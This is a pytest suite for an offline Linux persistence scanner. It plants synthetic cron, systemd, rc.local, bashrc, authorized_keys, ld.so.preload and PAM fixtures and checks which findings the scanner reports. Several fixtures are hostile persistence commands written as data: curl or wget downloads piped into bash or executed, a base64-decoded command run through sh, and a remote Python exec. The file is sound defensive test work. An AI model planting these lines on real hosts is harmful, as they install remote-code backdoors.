"""test_linux_persist_scan — audit lokasi persistensi Linux offline
(#0849), nol jaringan, tanpa host nyata.

Fixture = tree rootfs sintetis di tmp_path mengikuti format publik
crontab/systemd/authorized_keys/pam.d; bukan salinan kode alat sumber
dan bukan artefak host nyata.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import linux_persist_scan as lps  # noqa: E402


def _mk(root: Path, rel: str, content: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")
    return p


def _run(*args: str) -> "tuple[int, dict | None, str]":
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "linux_persist_scan.py"), *args],
        capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out, proc.stderr


def _checks(out: dict) -> "list[str]":
    return [f["check"] for f in out["findings"]]


def _benign_root(root: Path) -> None:
    _mk(root, "etc/crontab",
        "SHELL=/bin/bash\n"
        "# komentar\n"
        "17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly\n")
    _mk(root, "etc/systemd/system/sshd.service",
        "[Unit]\nDescription=OpenSSH server\n"
        "[Service]\nExecStart=/usr/sbin/sshd -D\n"
        "[Install]\nWantedBy=multi-user.target\n")
    _mk(root, "root/.ssh/authorized_keys",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB admin@lab\n")
    _mk(root, "etc/pam.d/sudo",
        "#%PAM-1.0\nsession required pam_unix.so\n")


# ------------------------------------------------------- input
def test_no_args_error():
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "linux_persist_scan.py")],
        capture_output=True, text=True)
    assert proc.returncode == 2


def test_missing_root_exit2(tmp_path):
    rc, out, err = _run("--root", str(tmp_path / "nope"))
    assert rc == 2 and out is None and "tidak ada" in err


def test_empty_root_collection_incomplete(tmp_path):
    rc, out, _ = _run("--root", str(tmp_path))
    assert rc == 1
    assert _checks(out) == ["collection-incomplete"]
    assert out["findings"][0]["severity"] == "medium"


# ------------------------------------------------------- cron
def test_cron_downloader(tmp_path):
    _mk(tmp_path, "etc/cron.d/sync",
        "*/5 * * * * root curl -s http://185.53.10.9/p.sh | bash\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"]
         if x["check"] == "cron-downloader"]
    assert len(f) == 1 and f[0]["severity"] == "high"
    assert f[0]["path"] == "etc/cron.d/sync"


def test_cron_encoded_and_tmp(tmp_path):
    _mk(tmp_path, "var/spool/cron/crontabs/www-data",
        "0 3 * * * echo aGVsbG8= | base64 -d | sh\n"
        "*/10 * * * * /tmp/.cache/update\n")
    rc, out, _ = _run("--root", str(tmp_path))
    checks = _checks(out)
    assert "cron-encoded-cmd" in checks
    assert "cron-tmp-path" in checks
    tmp_f = [x for x in out["findings"] if x["check"] == "cron-tmp-path"][0]
    assert tmp_f["path"].endswith("crontabs/www-data")


def test_cron_reboot_entry_info(tmp_path):
    _mk(tmp_path, "etc/crontab",
        "@reboot root /usr/local/bin/watchdog.sh\n")
    _, out, _ = _run("--root", str(tmp_path), "--fail-on", "info")
    rb = [x for x in out["findings"]
          if x["check"] == "cron-reboot-entry"]
    assert len(rb) == 1 and rb[0]["severity"] == "info"


def test_cron_benign_not_flagged(tmp_path):
    _mk(tmp_path, "etc/crontab",
        "0 2 * * * root /usr/bin/apt-get -y update >> /var/log/apt.log\n")
    rc, out, _ = _run("--root", str(tmp_path))
    assert rc == 0
    suspicious = [c for c in _checks(out)
                  if c.startswith(("cron-downloader", "cron-encoded",
                                   "cron-tmp"))]
    assert suspicious == []


# ------------------------------------------------------- systemd
def test_unit_downloader(tmp_path):
    _mk(tmp_path, "etc/systemd/system/updater.service",
        "[Service]\n"
        "ExecStart=/bin/sh -c 'wget http://cdn.example-svc.net/bin && "
        "chmod +x bin && ./bin'\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"] if x["check"] == "unit-downloader"]
    assert len(f) == 1 and f[0]["severity"] == "high"
    assert out["stats"]["unit_files"] == 1


def test_unit_tmp_path(tmp_path):
    _mk(tmp_path, "usr/lib/systemd/system/cache.service",
        "[Service]\nType=oneshot\nExecStartPre=/usr/bin/touch /dev/shm/ok\n"
        "ExecStart=/usr/bin/true\n")
    _, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"] if x["check"] == "unit-tmp-path"]
    assert len(f) == 1


# ------------------------------------------------------- rc.local & profile
def test_rc_local_suspicious(tmp_path):
    _mk(tmp_path, "etc/rc.local",
        "#!/bin/sh\n"
        "# start services\n"
        "python3 -c \"import urllib.request;exec(urllib.request.urlopen("
        "'http://x.example.lb/s').read())\"\n"
        "exit 0\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"]
         if x["check"].startswith("rc-local-")]
    assert len(f) == 1 and f[0]["check"] == "rc-local-encoded-cmd"


def test_profile_downloader(tmp_path):
    _mk(tmp_path, "root/.bashrc",
        "# normal alias\nalias ll='ls -la'\n"
        "curl -s http://telemetry.example.gc/beat >/dev/null\n")
    _mk(tmp_path, "etc/profile.d/99-motd.sh", "echo welcome\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"]
         if x["check"] == "profile-downloader"]
    assert len(f) == 1 and f[0]["path"] == "root/.bashrc"


# ------------------------------------------------------- authorized_keys
def test_authkey_forced_command_and_weak_type(tmp_path):
    _mk(tmp_path, "root/.ssh/authorized_keys",
        'command="/usr/bin/tail -f /var/log/x" ssh-ed25519 AAAA key1\n'
        "ssh-dss AAAAB3NzaC1kc3MAAA legacy@old\n")
    rc, out, _ = _run("--root", str(tmp_path))
    fc = [x for x in out["findings"]
          if x["check"] == "authkey-forced-command"]
    wk = [x for x in out["findings"] if x["check"] == "authkey-weak-type"]
    assert len(fc) == 1 and len(wk) == 1
    assert out["stats"]["authkey_lines"] == 2


def test_authkey_unparsed_fail_closed(tmp_path):
    _mk(tmp_path, "home/alice/.ssh/authorized_keys",
        "ini-bukan-baris-kunci\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"] if x["check"] == "authkey-unparsed"]
    assert len(f) == 1 and f[0]["severity"] == "high"


# ------------------------------------------------------- ld.preload / pam / modules
def test_ld_preload_entry(tmp_path):
    _mk(tmp_path, "etc/ld.so.preload", "/usr/local/lib/libhelper.so\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"] if x["check"] == "ld-preload-entry"]
    assert len(f) == 1 and f[0]["severity"] == "high"


def test_ld_preload_empty_clean(tmp_path):
    _mk(tmp_path, "etc/ld.so.preload", "# kosong\n")
    rc, out, _ = _run("--root", str(tmp_path))
    assert "ld-preload-entry" not in _checks(out)
    assert rc == 0 or _checks(out)  # lokasi lain boleh ada temuan


def test_pam_exec_hook(tmp_path):
    _mk(tmp_path, "etc/pam.d/sshd",
        "auth  optional  pam_exec.so /usr/local/sbin/notify.sh\n")
    rc, out, _ = _run("--root", str(tmp_path))
    f = [x for x in out["findings"] if x["check"] == "pam-exec-hook"]
    assert len(f) == 1 and f[0]["severity"] == "medium"


def test_module_load_entry_info(tmp_path):
    _mk(tmp_path, "etc/modules-load.d/custom.conf", "vhost_net\n")
    _, out, _ = _run("--root", str(tmp_path), "--fail-on", "info")
    f = [x for x in out["findings"] if x["check"] == "module-load-entry"]
    assert len(f) == 1 and f[0]["severity"] == "info"


# ------------------------------------------------------- fail-closed & kontrak
def test_benign_root_clean(tmp_path):
    _benign_root(tmp_path)
    rc, out, _ = _run("--root", str(tmp_path))
    assert rc == 0
    assert out["findings"] == []
    assert out["stats"]["locations_found"] >= 3


def test_allow_path_filter(tmp_path):
    _mk(tmp_path, "etc/systemd/system/updater.service",
        "[Service]\nExecStart=/bin/sh -c 'wget "
        "http://mirror.internal.lan/pkg'\n")
    rc, out, _ = _run("--root", str(tmp_path),
                      "--allow-path", "etc/systemd/system/updater.service")
    assert rc == 0
    assert out["stats"]["allowed_filtered"] == 1
    assert out["findings"] == []


def test_unreadable_file_finding(tmp_path):
    p = _mk(tmp_path, "etc/cron.d/x", "0 0 * * * root echo hi\n")
    p.chmod(0o000)
    try:
        rc, out, _ = _run("--root", str(tmp_path))
        checks = _checks(out)
        # Windows chmod mungkin tetap bisa baca — dua-duanya valid;
        # yang diuji: alat TIDAK meledak dan hasilnya deterministik
        assert rc in (0, 1)
    finally:
        p.chmod(0o644)


def test_schema_and_sorted(tmp_path):
    _mk(tmp_path, "etc/cron.d/a",
        "*/5 * * * * root curl -s http://a.example.rt/x | bash\n")
    _mk(tmp_path, "etc/ld.so.preload", "/tmp/libx.so\n")
    _, out, _ = _run("--root", str(tmp_path))
    assert out["schema"] == lps.SCHEMA
    sevs = [lps.SEV_ORDER[f["severity"]] for f in out["findings"]]
    assert sevs == sorted(sevs, reverse=True)
    assert all({"check", "severity", "path", "line", "message"}
               <= set(f) for f in out["findings"])
    assert any("win_persist_triage" in n for n in out["notes"])
